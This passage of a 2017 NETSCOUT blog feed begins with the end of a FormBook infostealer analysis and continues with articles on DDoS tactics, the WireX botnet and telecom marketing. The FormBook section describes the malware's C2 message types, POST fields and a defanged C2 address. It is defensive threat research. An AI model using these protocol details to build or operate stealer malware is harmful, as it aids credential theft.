	<li>Bot ID and bot version (missing “:”) (DDE857B3 and 2.9)</li>
	<li>Windows version</li>
	<li>Base64 encoded username</li>
</ul>

<p>Based on the leaked C2 panel code (see <a href="http://www.kernelmode.info/forum/viewtopic.php?f=16&amp;t=4796">this KernelMode.info forum thread</a>) there are a few types of phone home messages:</p>

<ul>
	<li>KNOCK_POST – the initial phone home as shown above</li>
	<li>RESULT_POST – results of a task</li>
	<li>IMAGE_POST – screenshot</li>
	<li>KEY_POST – key logger logs</li>
	<li>Form logger logs</li>
</ul>

<p>An example of an IMAGE_POST from another sample (version 2.6) looks like this:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/post_request.png" /></p>

<p>There are three POST parameters:</p>

<ul>
	<li>dat – encrypted data</li>
	<li>un – base64 encoded username</li>
	<li>br – web browser identifier</li>
</ul>

<p>The encrypted data is decrypted as above (using www[.]wowtracking[.]info/list/hx47/ as the C2 key component) and the first 100 decrypted bytes look like this:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypted_post_data.png" /></p>

<p>Here we can see:</p>

<ul>
	<li>Message type (FBIMG)</li>
	<li>Bot ID (DDE857B3)</li>
	<li>And the start of a JPEG file</li>
</ul>

<p>The JPEG file shows a screenshot of one of ASERT’s finest sandboxen:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/screenshot.png" /></p>

<h2>Conclusion</h2>

<p>FormBook is an infostealing malware that we’ve been seeing more and more of recently. This post has been an analysis of some of the obfuscations used in the FormBook malware to start getting an understanding of how it works. Based on samples in our malware zoo and search engine results, it seems to have gotten its start sometime in early 2016. With a cheap price tag (a few hundred dollars), general availability (for sale on Hack Forums), and a supposed release of a “cracked builder” there are quite a few FormBook samples and campaigns in the wild and we only expect to see more.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/default_images/blog_thumbnail_0.png" length="58011" type="image/png"/>
    <guid isPermaLink="false">b2374b35-39cd-43b4-95aa-45cb61fa0fbb</guid>
    <pubDate>Wed, 20 Sep 2017 09:20:52 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Virtualisation</title>
  <link>http://localhost:7996/blog/virtualisation</link>
  <description>NFV and SDN have been positioned as a panacea for enterprise and network operators large and small. The power of virtualisation would remove costly, purpose built hardware and replace it with commodity, common off the shelf (COTs) storage and compute</description>
  <content:encoded><![CDATA[<p><em><strong>Michael E. Serrano</strong>, <span style="color: #545454">Senior Product Marketing Manager at NETSCOUT, gives his views on the challenges of virtualisation. </span></em></p>

<p>For the past few years, NFV and SDN have been positioned as a panacea for enterprise and network operators large and small. The power of virtualisation would remove costly, purpose built hardware and replace it with commodity, common off the shelf (COTs) storage and compute. The proposition was easy to understand the benefits would be obvious. After all, software is “always” cheaper and more flexible then hardware.</p>

<p>Then, reality set in. Or, as the Hype Cycle would call it, we moved into the Trough of Disillusionment. After all virtualisation projects were taking longer to deploy, performance was lacking, software defined networking isn’t where everyone thought it would be. Is this a lesson that, ‘all that glitters, is not gold’ or is it something else?</p>

<p><img alt="virtualisation netscout" height="428" src="https://knect365.imgix.net/article/images/cacheable/3fdd0aa0-5c11-4259-9ba3-47b3a8aad644-0-1ef25cfba5a06cff88a562d3d483013c.png?w=900&amp;h=900&amp;fit=max&amp;or=0&amp;compress=true" width="660" /></p>

<p>As the industry moved to decouple hardware from software, there were a few other ‘minor’ movements that have added complexity and appeared to slow things down- in the short term. First, there was the realization that software could be improved- made more efficient- by moving to containers and micro-services. Of course, this required developers to come up to speed on new software tools and architectures.</p>

<p>Second, there was the move to open source. This would allow industry to leverage programming talent far beyond their current staff both in terms of quantity as well as skill sets. Of course, with open source comes movement away from standards, and standards have long been the hallmark of communications networks.</p>

<p>This brings us back to the current challenge of realizing the benefits of virtualisationation and moving forward to software defined networks (SDN) and self-optimizing networks (SON). Will we get there? When? Yes, we will ultimately have SDN and SON and they will operate on virtual infrastructure. But, we need to acknowledge that the problem as originally defined has become more complex. The additional challenges arise from the industry realizing early on that old software technique would not be sufficient for this new environment and deciding to address them now.</p>

<p>With everything changing and no standards, how is anyone supposed to have confidence that these new networks are operating correctly? Here is where visibility becomes imperative. Not only visibility to the performance of virtual elements but the interactions of virtual and physical elements as well as applications. It is ‘seeing the forest for the trees’ and understanding the ecosystem.</p>

<p>For peace of mind and confidence that networks and services are performing correctly, operators and enterprises should work with partners who provide continuous visibility as periodic or sampled visibility leaves the organization prone to errors. Executives should feel confident to go boldly into this new world of networking, but it doesn’t mean they should go blindly.</p>

<p><strong><em>About the Author:</em></strong><br />
<em>Mike has over 20 years of experience in the communications industry. He is currently responsible for Service Provider Marketing at NETSCOUT. He began his career at PacBell (now part of at&amp;t) where he designed service plans for the business market and where he was responsible for demand analysis and modeling. His career continued with Lucent technologies where he brought to market the first mobile data service technology. At Alloptic, he was responsible for marketing the industry’s first EPON access solution and bringing to market the first RFOG solution. At O3B Networks, Mike headed up marketing bringing to market the first MEO based constellation of satellites for serving internet service to the Other 3 Billion on the planet. Mike’s work continued at Cisco where he helped to define MediaNet (Videoscape) and the network technology transformation for cable operators. Mike holds a B.S. in Information Resource Management from San Jose State University and an MBA from Santa Clara University</em></p>

<p><a href="https://knect365.com/5g-virtualisation/article/3fdd0aa0-5c11-4259-9ba3-47b3a8aad644/virtualisation-where-did-it-all-go-wrong-and-what-to-do-next" target="_blank">This article originally appeared on KNect365.</a></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/Virtualization1200x480.jpg" length="248640" type="image/jpeg"/>
    <guid isPermaLink="false">e7c3175a-643c-421b-aac0-2d8b69d7ea6f</guid>
    <pubDate>Thu, 14 Sep 2017 14:30:40 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Mike Serrano</dc:creator>
    </item>
<item>
  <title>Handling Stealthy DDoS Attacks</title>
  <link>http://localhost:7996/blog/handling-stealthy-ddos-attacks</link>
  <description>From simple beginnings in the late nineties, DDoS attacks became bigger and badder throughout the early 2000s. Now, a more sophisticated kind of DDoS campaign is putting victims at even more risk. Stealthy, subsaturating attacks often signal more damaging network intrusions that can be difficult to spot. In their early days, DDoS attacks were mostly volumetric. They focused on...</description>
  <content:encoded><![CDATA[<p>From simple beginnings in the late nineties, DDoS attacks became bigger and badder throughout the early 2000s. Now, a more sophisticated kind of DDoS campaign is putting victims at even more risk. Stealthy, subsaturating attacks often signal more damaging network intrusions that can be difficult to spot.&nbsp;</p>

<p>In their early days, DDoS attacks were mostly volumetric. They focused on flooding targeted systems with as much traffic as possible to disrupt operations. Whereas volumetric attacks take a sledgehammer approach, subsaturating attacks are the surgical tools of the DDoS world. These subtler DDoS events send smaller amounts of traffic to a target that leave the majority of network services up and running. And&nbsp;this more sophisticated type of DDoS threat is becoming increasingly common.</p>

<p>For instance, while&nbsp;advanced threat protection solutions provider&nbsp;Arbor Networks has identified a rise in the average size of DDoS attacks in its&nbsp;<a href="http://resources.arbornetworks.com/resource-type/special-report/" target="_blank">12<sup>th</sup>&nbsp;Worldwide Infrastructure Security Report</a>,&nbsp;and an increase in the largest sizes of attack, the majority of DDoS attacks are still relatively small. The report found that 70 percent of all DDoS events send less than 500Mbps of traffic to their victims.</p>

<p>Luckily, measures exist to mitigate this brand of network assault.</p>

<h2>Inside Subsaturating Attacks</h2>

<p>Subsaturating attacks are useful ways for online villains to probe a network and find a weakness or vulnerability. They can flood a firewall or IPS device with just enough traffic to invalidate its state table—the internal, real-time list of connections that it keeps to track open connections to internal resources. This lets the attacker explore and manipulate the targeted network without rendering the victim’s internet connection inaccessible.</p>

<p>These attacks typically only occur for small amounts of time, lasting ten minutes or less. Their short duration makes it difficult for network administrators to react if they realize what’s going on, if at all. 84 percent of DDoS attacks <a href="http://resources.arbornetworks.com/resource-type/special-report/" target="_blank">last less than half an hour</a>.</p>

<p>If the attack is large enough for an administrator to spot but small enough to allow ongoing network access, then it can also serve as a distraction mechanism. While admins rush to stop the DDoS, the attacker can stealthily gain access via another weakness already identified in reconnaissance. This attack may be more difficult to spot in logs flooded with DDoS traffic.</p>

<p>Subsaturating attacks have already led to significant losses for victims. The #OPSONY DDoS hit on Sony’s PlayStation network in 2011 masked an underlying data exfiltration. In 2015, UK telco TalkTalk lost the personal details of 2.4m customers to attackers <a href="http://www.theregister.co.uk/2015/08/11/carphone_warehouse_ddos_before_giant_data_breach/" target="_blank">who reportedly used</a> a DDoS attack as a distraction.</p>

<p>Short, low-volume attacks can make the job even more difficult for administrators by using advanced protocol manipulation to help confuse and distract.</p>

<p>Whereas old-school attacks used lower-layer network protocol attacks like SYN and ICMP, more complex, modern attacks manipulate application-layer protocols like HTTP and HTTPS to directly tie up applications serving data over the web.</p>

<p>Often, attackers will target multiple services at once, possibly at different layers of the network stack. Two thirds of respondents in Arbor’s report suffered multi-vector attacks.</p>

<p>Whereas traditional DDoS attacks threaten operations, subsaturating attacks pose a clear and present security risk. Their different attack envelopes mean that customers should react differently to each. To do this, they must learn how to distinguish between them.</p>

<h2>Solutions for Distinguishing DDoS Attacks</h2>

<p><img alt="Network administrator working in data center room" height="322" src="https://images1.newscred.com/Zz0yMjllZThjYzA2NTNlNThlM2IyZjdlNjRhYjFkZDk3MA==" width="482.83905364878376" /></p>

<p>Legacy DDoS protection solutions designed to spot volumetric attacks may not catch subsaturating DDoS incidents. Cloud-based anti-DDoS services are useful for detecting and mitigating extended volumetric attacks, but they may be ill-designed to spot these smaller hits on the network. Companies must complement them with other solutions.</p>

<p>In this new, evolved era of DDoS, network visibility becomes increasingly important. On-premise network analysis and DDoS mitigation tools specifically designed with these attacks in mind can detect both volumetric and subsaturating attacks, alerting staff to their presence.</p>

<p>By increasing network visibility, companies can even turn these attacks to their advantage. An attacker probing a network with a subsaturating DDoS event may be planning something more intrusive later. If an administrator can spot these forays early enough, they could be able to take preventative action.</p>

<p>In this new, evolved era of advanced DDoS attacks, then, to be forewarned is to be forearmed.</p>

<p><em>~Written by&nbsp;Danny Bradbury. Danny is a technology journalist with over 20 years of experience writing about security, software development, and networking. He covers a mixture of business and consumer tech.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/computer-user-keyboard.jpg" length="254037" type="image/jpeg"/>
    <guid isPermaLink="false">73d7a09c-3554-40fe-a456-b22fc171d1bb</guid>
    <pubDate>Mon, 11 Sep 2017 15:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Down to the WireX</title>
  <link>http://localhost:7996/blog/asert/down-wirex</link>
  <description>Over the course of the last few weeks, a botnet comprised mainly of Android mobile devices has been utilized to launch a high-impact DDoS extortion campaign against multiple organizations in the travel and hospitality sector. This botnet, dubbed ‘WireX’, is only the second mobile botnet to have been confirmed to date as being used to launch DDoS attacks, and the first mobile...</description>
  <content:encoded><![CDATA[<p>Over the course of the last few weeks, a botnet comprised mainly of <a href="https://en.wikipedia.org/wiki/Android_(operating_system)">Android</a> mobile devices has been utilized to launch a high-impact <a href="https://app.box.com/s/776tkb82634ewvzvp26nnout6v4ij39q">DDoS extortion</a> campaign against multiple organizations in the travel and hospitality sector. This botnet, dubbed ‘WireX’, is only the second mobile botnet to have been confirmed to date as being used to launch DDoS attacks, and the first mobile botnet known to have been used in a DDoS extortion campaign.</p>

<p>A rapid, coordinated, round-the-clock response between network operators, content-delivery network (CDN) operators, authoritative DNS registrars/hosters, security researchers and Google has resulted in the identification of the Android applications into which the botnet code was seeded, its command-and-control infrastructure, and the removal of the compromised applications from Google Play. Google has also taken action to force the de-installation of this malware from Android devices which are configured to download and update applications from Google Play, and to prevent similar compromised applications from being uploaded to Google Play in future.</p>

<h2>WireX Botnet and DDoS Attack Methodology</h2>

<p>The botted Android devices in the WireX botnet were capable of launching HTTP and HTTP/S application-layer attacks against designated targets. As WireX was originally used by its operators to commit click-fraud prior to their venture into DDoS extortion, WireX did not have the ability to generate others types of DDoS attack traffic.</p>

<p>It is estimated that ~130,000 - ~160,000 bots were active at any given moment during the attack campaign. In aggregate, WireX exhibited attack volumes of 20,000 HTTP/S requests/second. These attacks consisted of GET and/or POST commands for pseudo-randomized, non-existent URIs; this tactic was chosen in order to bypass any front-end caching deployed in front of the target Web servers/applications, as well as to complicate mitigation efforts. Pseudo-randomized HTTP User-Agent strings were observed in the attack traffic, ranging from nonsense strings of variable length to a variety of legitimate and legitimate-seeming, but actually invalid, values. As the WireX Android bot code was based on a ‘headless’ JavaScript-capable browser, it reacted to HTTP responses from the targeted servers in a manner similar to that of a legitimate, user-operated Web browser.</p>

<p>While the attacker began by using easily-identifiable HTTP User-Agents, it was clear that as defenders successfully mitigated the attacks, the attacker was monitoring attack efficacy and began changing the User-Agents and other attack traffic characteristics in response. This suggests that the attacker did not have much experience launching DDoS attacks, but learned rapidly to try different techniques to try to thwart the defenders.</p>

<p>The mobile aspect of the WireX botnet resulted in a higher-than-normal churn of attacking source IPs; as the unwitting owners of botted Android devices moved from LAN to LAN, or mobile data cell to mobile data cell, the IP addresses of the attacking devices often changed. Also, some proportion of mobile device owners power down their devices when not in use, which often results in different IP addresses being assigned to the same devices upon startup.</p>

<p>Several of the organizations involved in the WireX analysis and remediation effort have compiled a report of the details of the Android bot code and its command-and-control infrastructure - prominent investigative reporter and security researcher Brian Krebs has posted an excellent overview of their findings, as well as providing links to the actual report itself. Krebs’ article may be found <a href="https://krebsonsecurity.com/2017/08/tech-firms-team-up-to-take-down-wirex-android-ddos-botnet/">here</a>.</p>

<h2>A Firm Foundation Ensures Resilience to Attacks</h2>

<p>In addition to understanding how this particular botnet was constructed and operated, it’s important that organizations implement best current practices (BCPs) for their network infrastructure, application/service delivery stacks, and ancillary supporting services. This will allow the organization to maintain availability and ensure continuous service delivery even in the face of attack.</p>

<p>Network infrastructure BCPs such as infrastructure ACLs (iACLs) to protect routers and layer-3 switches from attack, transit ACLs (tACLs) to enforce situationally-specific network access policies, and a sound, scalable network topology, are extremely important. While WireX did not attack network infrastructure devices directly, many botnets are capable of doing so and attackers will often choose to target the network itself rather than end-hosts, in hopes of causing a loss of availability due to lack of preparation on the part of the defenders. An overview of network infrastructure BCPs may be found <a href="https://app.box.com/s/osk4po8ietn1zrjjmn8b">here</a>.</p>

<p>Application/service delivery stacks must be designed, implemented, and operated in a scalable, resilient manner which allows not only for the highest possible degree of self-protection, but for defenders to have the ability to quickly detect, classify, and traceback DDoS attack traffic. BCPs in this arena include architectural principles such as clear separation between public-facing front-ends and application/service back-ends, reverse proxies to provide layer-7 policy enforcement and inspection of encrypted traffic such as HTTP/S, well-defined URI schemas, as well as ensuring that packets from outside the organization’s network can never directly reach servers and other key delivery elements. Instead, all connections, queries, transactions, responses, etc. should be mediated at both layer-4 and layer-7. For HTTP and HTTP/S, reverse-proxies such as <a href="http://nginx.org/">NGINX</a> should be implemented; for authoritative DNS, <a href="https://app.box.com/s/72bccbac1636714eb611">a logically-segmented DNS architecture</a> making use of hidden masters and external resolvers is strongly recommended.</p>

<h2>Elements of DDoS Defense</h2>

<p>Every year, Arbor conducts a survey of network operators worldwide, including ISPs, enterprises, CDN operators, wireless and wireline broadband access providers, etc. The results of this survey are published in the annual Arbor Worldwide Infrastructure Security Report (WISR).</p>

<p>One of the key findings of the WISR is that many organizations do not have a DDoS defense plan in place; of the subset which do, many of those organizations have never rehearsed their plan. It is critical that organizations devise and rehearse their DDoS defense plans in order to ensure that they have the requisite personnel, skills, operational processes, communications plans, and support services in place to defend their Internet properties in a timely and effective manner.</p>

<p>Organizations must have the ability to detect, classify, and traceback DDoS attack traffic; they must be able to distinguish between normal traffic patterns and abnormal, and potentially harmful, Internet traffic. <a href="https://www.netscout.com/arbor-ddos">Arbor SP</a> provides insight into all Internet traffic ingressing and egressing the network, and alerts the operational security team for both pathological DDoS traffic such as SYN-floods, UDP and TCP reflection/application attacks, DNS query floods, etc., but also to shifts in apparently semantically correct traffic which can represent layer-7 DDoS attacks focused on HTTP and HTTP/S.</p>

<p>Arbor <a href="https://www.netscout.com/arbor-ddos">APS</a> and <a href="https://www.netscout.com/arbor-ddos">TMS</a> are intelligent DDoS mitigation systems (IDMSes) with a full suite of active DDoS countermeasures, including functionality specifically designed to mitigate layer-7 HTTP and HTTP/S DDoS attacks such as those launched by the WireX Android botnet. Additionally, network infrastructure-based mitigation techniques such as source-based remotely-triggered blackholing (S/RTBH) and flowspec <a href="https://app.box.com/s/xznjloitly2apixr5xge">can also be leveraged using Arbor solutions</a>.</p>

<p><a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="2d796577-6abd-48f7-92f9-d44b7a1d3e5a" href="http://localhost:7996/arbor-ddos" title="DDoS Solutions">Arbor Cloud</a> offers a managed DDoS mitigation service utilizing Arbor DDoS defense solutions, which can be leveraged as an entirely cloud-based mitigation solution, or in a hybrid DDoS defense architecture consisting of both cloud-based and customer premise-deployed Arbor solution elements.</p>

<h2>Conclusion</h2>

<p>WireX is a reference case for how botnets originally intended for purposes such as click-fraud and <a href="https://en.wikipedia.org/wiki/Email_spam">spam</a> can be re-purposed to launch DDoS attacks. And it is also a harbinger of things to come; we anticipate significant growth in the abuse of mobile devices to launch DDoS attacks. At the same time, the architectural principles, tools, techniques, processes, and skills required to mitigate DDoS attacks launched by fixed-node botnets also apply to WireX and similar mobile botnets. Organizations which implement the BCPs noted above will be well-prepared to mitigate DDoS attacks from botnets of any type, including mobile botnets such as WireX, now and in the future.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <guid isPermaLink="false">8851dc56-c671-4ebc-9f0c-7f770bc9254b</guid>
    <pubDate>Thu, 31 Aug 2017 11:18:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Self-Service Analytics for All</title>
  <link>http://localhost:7996/blog/self-service-analytics-all</link>
  <description>Trying to capture insights from the deluge of traffic data descending on service provider networks can sometimes feel like walking outside in a rainstorm holding out a paper cup. There’s so much data, in so many different places, and it’s cumbersome to access and manipulate when you’re relying on writing database or SQL queries. But the complex methods of getting at traffic...</description>
  <content:encoded><![CDATA[<p>Trying to capture insights from the deluge of traffic data descending on service provider networks can sometimes feel like walking outside in a rainstorm holding out a paper cup. There’s so much data, in so many different places, and it’s cumbersome to access and manipulate when you’re relying on writing database or SQL queries.&nbsp;</p>

<p>But the complex methods of getting at traffic data are giving way to simpler solutions. Tools that greatly simplify exploration of network traffic data―along with access to richer, real-time, more granular data points based on packets―are now available. This means that non-technical personnel in various departments throughout service provider organizations can use these tools to do sophisticated analysis of traffic data.</p>

<p>The era of self-service analytics for all has arrived.</p>

<h2><strong>Out with the Old</strong></h2>

<p>Until recently, the ability to tap into data repositories to perform operational, business or marketing analytics has been constrained by the limitations of current data science tools. The need to write scripts and queries to extract insights into traffic data, for example, has limited access to a limited number of people within service provider environments to limited data sets such as log files and device stats. Data exploration and analysis are further constrained by different proprietary products and diverse data models.</p>

<p>Getting answers to operational or business questions is therefore a hassle. It requires collecting and correlating traffic data from various sources. Then the data must be delivered to the different applications and tools used by each group within your organization to support operational or business intelligence efforts. There’s no systematic approach to data enablement. Data sources and output formats are often unique for each specific department or query.</p>

<p>It’s a slow, manual process. And with the glut of data coming at you, it’s hampering your ability to make timely decisions to guide your business.</p>

<h2><strong>Point-And-Click Your Way to New Big Data Insights&nbsp;</strong></h2>

<p>Imagine business and operational analysts from across a service provider organization―in marketing, sales, technical support, product management, and the executive suite―building queries using templates with drop-down menus that let them more easily dig deep into traffic data points. Perhaps you want to look at network traffic data on a particular Thursday between 1 to 3 PM for a specific smartphone.</p>

<p><img alt="Young Asian casual business man using smartphone in cafe" height="322" src="https://images1.newscred.com/Zz05YTk0OGVmZTMzYmI5YWI2NTJlYTAxYWU1MzYzNmVlOA==" style="display: block; margin-left: auto; margin-right: auto;" width="482.3247453565009" /></p>

<p>Just launch an app and a Google search-like capability is at the ready. You configure your query with drop-downs that let you specify the subscriber device, time, and location parameters. Then hit 'enter' and you receive data that is fully indexed―no manual coding or indexing is required. You can create filters to further refine your data exploration (e.g., counting unique cells by market, app, handset or subscribers).</p>

<p>Use the tool to create key performance indicators (KPIs), again using user-friendly drop-down menus. Perhaps you're interested in knowing when errors for HTTP/HTTPS applications on iPhones hit a certain high volume. Building your KPI, you can introduce parameters to report if the error rate is improving or worsening, to report how many subscribers are impacted and their locations. As with your data queries and filters, insights from your KPI are represented visually, in different types of charts and maps.</p>

<p>Such a self-service analytics environment is a breath of fresh air. It empowers more business and technical personnel while relieving your data scientists of mundane query tasks to let them spend more of their time on more important things, like integrating disparate big data sets.</p>

<h2><strong>Richer and Broader Traffic Data</strong></h2>

<p>Beyond the self-service nature of these new tools, the quality of data and metadata you can look at has also improved dramatically. Real-time deep packet analysis tools let you gather traffic metadata for richer and more scalable views. Traffic crossing an IP network carries the services and applications used by subscribers. It's a rich source of business insights. Multimedia services, increased traffic volumes, multi-tier application architectures, server virtualization and the increasing levels of physical and virtual multi-domain traffic flows driven by cloud-based services have made getting at this data more challenging. But deep packet analysis makes it possible to capture individual user sessions and to visualize the interrelated transactions occurring within a specific session for unprecedented visibility into complex multi-tier, multi-domain service delivery environments.</p>

<p><img alt="undefined" height="322" src="https://images2.newscred.com/Zz1kNTg3MDFkY2M1M2E2ZTJjMDQ4ODk1MTQ2NTQyOTRjZA==" style="display: block; margin-left: auto; margin-right: auto;" width="470.96649484536084" /></p>

<p>Complex services can be tracked, captured and analyzed across multi-domain IP networks. The performance of applications and services across physical and virtual environments distributed across cloud-based, enterprise, branch office and remote office infrastructure can be captured and analyzed. You can use this data to optimize and troubleshoot operations, understand the subscriber experience and uncover business opportunities.</p>

<h2><strong>The Impact of Self-Service Analytics</strong></h2>

<p>Easier-to-use and more powerful data exploration tools and access to richer and broader traffic data are coming just in time. Why? Because if you work for a service provider you know that the data volumes are growing like gangbusters. There's voice, data, video and many other services; diverse types of subscribers and devices; geolocation details for mobile users; and your company's own business data to crunch. Beyond making sure that your customers have a good experience and that the network is highly available, you need to look at all of this data for many other reasons. To improve retention rates and upsell. To counter competitors and monetize subscriber data. To make sure that new offerings work as promised.</p>

<p>Knowing which services are being used and by whom, where, when and how is the kind of business intelligence that can lead to great new offerings, partnerships, or better pricing. Uncovering historical or real-time trends can support resource optimization for cost savings and maintenance of quality of service when demand spikes.</p>

<p>Self-service network traffic exploration is here. It’s going to empower your organization to uncover actionable, real-time insights based on access to rich metadata. Manual data manipulation and correlation are on the way out. Correlation and normalization of multiple data sources with differing levels of detail are on the way in. You can still use your third-party analysis tools or databases but now you can access vast amounts of traffic data quickly and easily and become a real-time business decision-maker.</p>

<p><em>~Written by&nbsp;Gene Knauer. Gene is a senior content marketing writer who works with technology companies in a variety of B2B marketing communications projects.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/self-serve-analytics.jpg" length="217747" type="image/jpeg"/>
    <guid isPermaLink="false">89b24478-417f-439c-af0f-cd4b786f7388</guid>
    <pubDate>Thu, 31 Aug 2017 10:30:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>How IoT and Big Video Make the Case for 5G Investments</title>
  <link>http://localhost:7996/blog/how-iot-and-big-video-make-case-5g-investments</link>
  <description>Although 5G networks still remain some years away from commercial deployment, pilot projects and extensive testing are well underway and it is clear that the technology will be deployed globally within a decade. Naturally, this will be an enormous task and cost billions but it will also be a different type of network technology rollout than those that have come before it. It...</description>
  <content:encoded><![CDATA[<p>Although 5G networks still remain some years away from commercial deployment, pilot projects and extensive testing are well underway and it is clear that the technology will be deployed globally within a decade. Naturally, this will be an enormous task and cost billions but it will also be a different type of network technology rollout than those that have come before it. It will certainly be unlike the rollout of 3G wireless networks, which were deployed in the hope that demand would eventually emerge, yet, the 5G opportunities that exist are so extensive it becomes challenging for service providers to define a crystal clear business case.</p>

<p>However, 5G inescapably requires the telecoms industry to gear up for another round of intense investment in network equipment and spectrum as there are numerous business opportunities for service providers to exploit.<br />
<br />
These fall into two broad categories:</p>

<ol>
	<li>The apps and services delivered by service providers to consumers</li>
	<li>The capabilities service providers deliver to other enterprises to enable services to be delivered to their own consumers</li>
</ol>

<p>Both can be monetized effectively if the expected efficiencies of 5G are achieved.</p>

<h2><strong>Beyond Consumer Capacity</strong></h2>

<p>The more familiar model for service providers is in providing additional network-enabled capabilities to consumers. In the case of 5G, this will result in service providers being able to support demand for greater bandwidth for big video services, such as 360-degree video, and immersive experiences such as gaming, augmented reality and virtual reality.</p>

<p style="text-align: center;"><img alt="Girl gesturing while using virtual reality glasses in classroom" height="322" src="https://images3.newscred.com/Zz0yYzgwMzIwMmE0MmY1NmRiMDJjODU1NjZmODc5Yjk0Mg==" width="483.00000000000006" /></p>

<p>These aren’t just cases in which service providers can sell more bandwidth and generate more revenue based only on selling simple network access. The access itself is commoditized so service providers will rely on 5G to bring down the cost of bandwidth provision while simultaneously opening up new monetization opportunities if they can prove that they are delivering additional value.</p>

<p>5G then has the potential to enable service providers to monetize higher quality service provision such as low latency capacity as a premium subscription for services such as multiplayer gaming. For users to willingly pay a premium for such services, service providers will need to provide service level agreements (SLAs) that ensure customers receive the quality of service they pay for. For service providers offering such SLAs, it will be important that the service level offered is assured if they are to avoid having to pay compensation for not meeting the quality of service (QoS) mandated in the SLA.</p>

<p style="text-align: center;"><img alt="Video game addiction. Excessive play, lifestyle" height="322" src="https://images1.newscred.com/Zz04OWI2N2I5OTQ1YzMzMjAxMDJjMjVmYjAwYTk0ZGVkNA==" width="483" /></p>

<p style="text-align: left;">Similarly, they may be able to sell enhanced network access, like for sharing video from a busy event, by levying a one-time charge. Again, this will require service assurance to make sure that the video service quality offered is what the user receives.</p>

<h2><strong>Into the Enterprise</strong></h2>

<p>The second category of serving other enterprises represents a newer territory for service providers in which service providers can be the enablers of other organizations’ digital transformations by utilizing 5G to support the latency, reliability, coverage, capacity and security requirements of the applications and services of other industries.</p>

<p>In the Internet of Things (IoT), 5G will be a critical enabler of service in market segments such as smart grids, smart driving, smart manufacturing and mHealth. The value chain in these markets isn’t set and service providers can have a central role in enabling the offerings of many different players by enabling real-time services such as power generation monitoring and management for energy companies or assisted driving applications for car makers or road operators. Service assurance will be the critical technology that underpins service providers' abilities to charge premiums for the additional functionality. For life-threatening services, such as heart monitoring in mHealth, the stakes are raised and enterprises will want to be able to prove the extent to which they have gone to ensure services are of high quality and uninterrupted. Service providers' capabilities to assure such services will be more deeply analysed as enterprises seek to prove their regulatory compliance and risk minimization in the event of an incident.</p>

<p style="text-align: center;"><img alt="" src="5G,%20IoT,%20Internet%20of%20Things,%20open%20infrastructure,%20convergence,%20edge%20analytics,%20cloud%20analytics,%20IoT%20ecosystems" /><img alt="Black mobile smartphone with map gps navigation app" height="322" src="https://images3.newscred.com/Zz05ZDQ3ZmQ5MTIxYTBkNzJjNDUzNTIzMzljNTFiZjBjNg==" width="486.2857142857143" /></p>

<p>However, getting to that point from here is highly complex and involves many discrete challenges that will require substantial service provider investment, including learning of new skills and adoption of new processes. 5G will be the first network technology to be deployed in the virtualized era so service providers will need to master management of virtualized infrastructure and self-organizing networks. In addition, new technological approaches such as network slicing will need to be learned and deployed in order to enable maximized capacity utilization and for 5G cost efficiencies to be harnessed.</p>

<p>The dynamic nature of demand coupled with the wide variance in requirements of different types of applications, services and enterprises will mean that service providers will need to devote resources to understanding the needs of other industries in order to serve them effectively. Service providers will need to focus on their network and business analytics to understand the impact of specific services on the network, to learn the demand profile and behavior of users and to report accurately to customers that pay them a premium.</p>

<p>By becoming the guide and enabler of other enterprises’ digital transformations at the same time as they support consumers’ more individualized needs, service providers can redefine their role in the digital value chain and generate sufficient revenue to fully support the 5G business case.</p>

<p><em>~ Written by&nbsp;George Malim. George&nbsp;is a freelance journalist who covers the telecoms and internet markets.</em></p>

<p>Learn more in our new white paper: 5G Ready Now! The Fourth Industrial Revolution – 5G IoT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/looking-through-vr-headset.jpg" length="271282" type="image/jpeg"/>
    <guid isPermaLink="false">af33eb97-0242-4ab6-a3b6-f3d218f13104</guid>
    <pubDate>Tue, 29 Aug 2017 16:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>How to Avoid Network Invisibility</title>
  <link>http://localhost:7996/blog/how-avoid-network-invisibility</link>
  <description>The move to the cloud and an increasingly virtual infrastructure are radically changing service provider network topologies. And for many very good reasons. But along with the amazing benefits of cloud, virtualization, software-defined networking (SDN) and other disruptive technologies and architectures, beware. As your network becomes more virtualized/physical/hybrid and cloud...</description>
  <content:encoded><![CDATA[<p>The move to the cloud and an increasingly virtual infrastructure are radically changing service provider network topologies. And for many very good reasons. But along with the amazing benefits of cloud, virtualization, software-defined networking (SDN) and other disruptive technologies and architectures, beware. &nbsp;</p>

